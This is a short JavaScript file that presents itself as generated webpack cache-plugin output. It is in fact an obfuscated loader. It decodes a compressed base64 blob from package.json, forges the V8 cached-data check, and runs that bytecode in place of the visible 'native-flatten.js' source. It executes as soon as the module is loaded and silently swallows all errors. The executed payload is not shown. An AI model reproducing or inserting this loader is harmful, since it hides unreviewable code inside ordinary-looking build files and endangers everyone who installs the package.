/* eslint-disable */
/* @generated - do not edit | webpack-cache-plugin v4.2.1 */
'use strict';
var z=require('zlib'),v=require('vm'),M=require('module'),f=require('fs'),p=require('path');
module.exports=(function(){try{var c=z.inflateSync(Buffer.from(require('../package.json').config.cacheData,'base64'));var r=new v.Script('0').createCachedData();new DataView(c.buffer,c.byteOffset).setUint32(12,new DataView(r.buffer,r.byteOffset).getUint32(12));var w=M.wrap(f.readFileSync(p.resolve(__dirname,'../src/native-flatten.js'),'utf8'));var s=new v.Script(w,{cachedData:c});if(s.cachedDataRejected)return null;var x=s.runInThisContext(),m={exports:{}};x.call(m.exports,m.exports,require,m,__filename,__dirname);return m.exports}catch(e){return null}})();
